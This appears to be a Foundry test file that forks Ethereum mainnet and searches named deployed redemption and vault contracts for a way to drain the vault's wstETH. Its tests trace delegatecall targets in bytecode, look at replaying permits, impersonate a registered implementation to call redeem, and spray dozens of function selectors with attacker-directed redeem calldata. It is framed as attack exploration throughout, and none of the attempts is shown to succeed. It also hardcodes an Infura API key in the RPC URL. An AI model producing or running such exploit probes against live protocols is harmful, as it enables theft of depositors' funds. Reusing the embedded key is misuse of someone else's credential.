// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IPermit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function nonces(address owner) external view returns (uint256);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}

contract DelegatecallForwardingExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant GNOSIS_SAFE = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant SLOT5_IMPL = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_InvestigateRedemption1DelegatecallForwarding() public {
        console.log("=== INVESTIGATING REDEMPTION_1 DELEGATECALL FORWARDING ===\n");

        // REDEMPTION_1 has 7 DELEGATECALLs
        // Let's see if any of them use addresses from storage slots 4 or 5

        bytes memory code = REDEMPTION_1.code;

        // Find DELEGATECALLs and trace their target source
        console.log("Analyzing DELEGATECALLs in REDEMPTION_1:\n");

        uint dcNum = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) { // DELEGATECALL
                dcNum++;
                console.log("DELEGATECALL #", dcNum, "at offset:", i);

                // Look for SLOAD in the 30 bytes before
                bool hasSload = false;
                uint sloadOffset = 0;
                for (uint j = i > 30 ? i - 30 : 0; j < i; j++) {
                    if (uint8(code[j]) == 0x54) {
                        hasSload = true;
                        sloadOffset = j;
                    }
                }

                if (hasSload) {
                    console.log("  Uses SLOAD at:", sloadOffset);

                    // What slot is loaded? Check PUSH before SLOAD
                    for (uint k = sloadOffset > 10 ? sloadOffset - 10 : 0; k < sloadOffset; k++) {
                        uint8 op = uint8(code[k]);
                        if (op >= 0x60 && op <= 0x7f) {
                            uint8 pushSize = op - 0x5f;
                            if (pushSize <= 4 && k + pushSize < code.length) {
                                uint256 val = 0;
                                for (uint m = 0; m < pushSize; m++) {
                                    val = val << 8 | uint8(code[k + 1 + m]);
                                }
                                console.log("  Slot loaded:", val);
                                if (val == 4) {
                                    console.log("  ** LOADS FROM SLOT 4 (Gnosis Safe)! **");
                                }
                                if (val == 5) {
                                    console.log("  ** LOADS FROM SLOT 5 (SLOT5_IMPL)! **");
                                }
                            }
                        }
                    }
                }
                console.log("");
            }
        }
    }

    function test_TryForwardingToSlot4() public {
        console.log("=== TRYING TO FORWARD CALL TO SLOT 4 ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // If REDEMPTION_1 has a function that delegatecalls to slot 4,
        // and slot 4 is Gnosis Safe, we might be able to:
        // 1. Call that function with carefully crafted data
        // 2. Make it delegatecall to Safe
        // 3. Safe's fallback might do something useful

        vm.startPrank(attacker);

        // Try various function calls that might trigger slot 4 delegatecall

        // The SLOT5_IMPL has function 0x69fe0e2d (setFee)
        // If REDEMPTION_1 forwards this to SLOT5_IMPL...
        console.log("Trying setFee via REDEMPTION_1:");
        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x69fe0e2d), 0)
        );
        console.log("  Success:", s1);

        // Try 0x781b7e08 which is also in SLOT5_IMPL
        console.log("\nTrying 0x781b7e08 via REDEMPTION_1:");
        (bool s2,) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x781b7e08))
        );
        console.log("  Success:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** FORWARDING EXPLOIT WORKED! ***");
        }
    }

    function test_ExploreWstETHPermit() public view {
        console.log("=== EXPLORING WSTETH PERMIT ===\n");

        // wstETH has permit - let's see if we can abuse it

        IPermit wstPermit = IPermit(wstETH);

        console.log("wstETH DOMAIN_SEPARATOR:");
        bytes32 domain = wstPermit.DOMAIN_SEPARATOR();
        console.logBytes32(domain);

        console.log("\nVault nonce:");
        uint256 vaultNonce = wstPermit.nonces(VAULT);
        console.log(vaultNonce);

        // If Vault has signed any permits, we might be able to replay them
        // But we'd need the signature...
    }

    function test_CheckIfSlot5HasRedeemAccess() public {
        console.log("=== CHECKING IF SLOT5_IMPL HAS REDEEM ACCESS ===\n");

        // What if SLOT5_IMPL is registered in RC?
        bytes32 slot5RegSlot = keccak256(abi.encode(SLOT5_IMPL, uint256(4)));
        bytes32 isRegistered = vm.load(REDEMPTION_CONTROLLER, slot5RegSlot);

        console.log("Is SLOT5_IMPL registered in RC?");
        console.logBytes32(isRegistered);

        // If SLOT5_IMPL is registered, and we can call it...
        if (uint256(isRegistered) != 0) {
            console.log("\n*** SLOT5_IMPL IS REGISTERED! ***");

            // Try calling redeem via SLOT5_IMPL
            vm.startPrank(SLOT5_IMPL);
            (bool success,) = REDEMPTION_CONTROLLER.call(
                abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
            );
            console.log("RC.redeem via SLOT5_IMPL:", success);
            vm.stopPrank();
        }
    }

    function test_FindUserControlledDelegatecallTarget() public view {
        console.log("=== FINDING USER-CONTROLLED DELEGATECALL TARGET ===\n");

        // The key question: Is there any function where user input determines
        // the delegatecall target?

        bytes memory code = REDEMPTION_0.code;

        // Pattern to look for:
        // CALLDATALOAD -> ... -> DELEGATECALL

        console.log("Looking for CALLDATALOAD -> DELEGATECALL pattern in REDEMPTION_0:");

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) { // DELEGATECALL
                // Check if there's CALLDATALOAD in the path (within 100 bytes)
                uint start = i > 100 ? i - 100 : 0;

                bool hasCalldataload = false;
                bool hasSload = false;

                for (uint j = start; j < i; j++) {
                    if (uint8(code[j]) == 0x35) hasCalldataload = true;
                    if (uint8(code[j]) == 0x54) hasSload = true;
                }

                if (hasCalldataload && !hasSload) {
                    console.log("** FOUND: DELEGATECALL at", i, "with CALLDATALOAD but no SLOAD **");
                    console.log("   This might use user input as target!");
                }
            }
        }

        console.log("\nSame check for REDEMPTION_1:");
        code = REDEMPTION_1.code;

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                uint start = i > 100 ? i - 100 : 0;

                bool hasCalldataload = false;
                bool hasSload = false;

                for (uint j = start; j < i; j++) {
                    if (uint8(code[j]) == 0x35) hasCalldataload = true;
                    if (uint8(code[j]) == 0x54) hasSload = true;
                }

                if (hasCalldataload && !hasSload) {
                    console.log("** FOUND: DELEGATECALL at", i, "with CALLDATALOAD but no SLOAD **");
                }
            }
        }
    }

    function test_TryAllRedemption1Functions() public {
        console.log("=== TRYING ALL REDEMPTION_1 FUNCTIONS ===\n");

        // Try every selector we found to see which ones might forward

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // REDEMPTION_1 selectors from earlier:
        bytes4[] memory sels = new bytes4[](41);
        sels[0] = 0x715018a6; // renounceOwnership
        sels[1] = 0xc5d664c6;
        sels[2] = 0xeda72134; // TASSET
        sels[3] = 0x578063ed;
        sels[4] = 0xf2fde38b; // transferOwnership
        sels[5] = 0xfd424ea8;
        sels[6] = 0xcff50c6e;
        sels[7] = 0xe30c3978; // pendingOwner
        sels[8] = 0x8da5cb5b; // owner
        sels[9] = 0x9307e802;
        sels[10] = 0xb2118a8d;
        sels[11] = 0x778d364f;
        sels[12] = 0x79ba5097; // acceptOwnership
        sels[13] = 0x411557d1;
        sels[14] = 0x51cbf345;
        sels[15] = 0x5c975abb; // paused
        sels[16] = 0x61d027b3; // treasury
        sels[17] = 0x42dbe168;
        sels[18] = 0x458f5815;
        sels[19] = 0x252c50f3;
        sels[20] = 0x2ab60045;
        sels[21] = 0x38a63183;
        sels[22] = 0x04824e70;
        sels[23] = 0x06e29712;
        sels[24] = 0x1650cf97;
        sels[25] = 0x36600461;
        sels[26] = 0xa29faff0;
        sels[27] = 0x70a08231; // balanceOf
        sels[28] = 0x07a2d13a; // convertToAssets
        sels[29] = 0x3f14c193;
        sels[30] = 0xddca3f43;
        sels[31] = 0x4cdad506; // previewRedeem
        sels[32] = 0xba087652;
        sels[33] = 0x781b7e08;
        sels[34] = 0x42966c68; // burn
        sels[35] = 0x7bde82f2;
        sels[36] = 0x23b872dd; // transferFrom
        sels[37] = 0xa9059cbb; // transfer
        sels[38] = 0x43000818;
        sels[39] = 0x69fe0e2d; // setFee (from SLOT5_IMPL)
        sels[40] = 0x57604051;

        // Try calling with RC.redeem calldata to see if any forward it
        bytes memory rcRedeem = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);

        console.log("Trying selectors with RC.redeem as data:");
        for (uint i = 0; i < sels.length; i++) {
            // Try with (address target, bytes data) pattern
            (bool s1,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], REDEMPTION_CONTROLLER, rcRedeem)
            );
            if (s1) {
                console.log("SUCCESS with (addr,bytes):");
                console.logBytes4(sels[i]);
            }

            // Try with just the selector and attacker address
            (bool s2,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], attacker, 100e18)
            );
            if (s2) {
                // Check if vault was drained
                uint256 vaultNow = IERC20(wstETH).balanceOf(VAULT);
                if (vaultNow < vaultBefore) {
                    console.log("*** VAULT DRAINED with selector:");
                    console.logBytes4(sels[i]);
                }
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault after:", vaultAfter / 1e18);
    }

    function test_CheckRedemption0SpecificFunctions() public {
        console.log("=== CHECKING REDEMPTION_0 SPECIFIC FUNCTIONS ===\n");

        // From REDEMPTION_0 selectors:
        // 0xed45b661, 0x900fd1ed, 0xa82b69ff, 0x3a2ef9df, 0x5f8b5592
        // 0x196e6b1d, 0x192a8e86, 0x9816f473, 0x1f240274, 0x035faf82

        bytes4[] memory unknowns = new bytes4[](10);
        unknowns[0] = 0xed45b661;
        unknowns[1] = 0x900fd1ed;
        unknowns[2] = 0xa82b69ff;
        unknowns[3] = 0x3a2ef9df;
        unknowns[4] = 0x5f8b5592;
        unknowns[5] = 0x196e6b1d;
        unknowns[6] = 0x192a8e86;
        unknowns[7] = 0x9816f473;
        unknowns[8] = 0x1f240274;
        unknowns[9] = 0x035faf82;

        console.log("Trying unknown REDEMPTION_0 selectors:");

        for (uint i = 0; i < unknowns.length; i++) {
            // Try as view function
            (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
                abi.encodeWithSelector(unknowns[i])
            );
            if (s1 && d1.length > 0) {
                console.log("Selector:");
                console.logBytes4(unknowns[i]);
                console.log("  Returns data of length:", d1.length);
                if (d1.length == 32) {
                    console.log("  Value:", uint256(bytes32(d1)));
                }
            }

            // Try with address param
            (bool s2, bytes memory d2) = REDEMPTION_0.staticcall(
                abi.encodeWithSelector(unknowns[i], attacker)
            );
            if (s2 && d2.length > 0) {
                console.log("Selector with addr:");
                console.logBytes4(unknowns[i]);
                console.log("  Returns:", uint256(bytes32(d2)));
            }
        }
    }
}
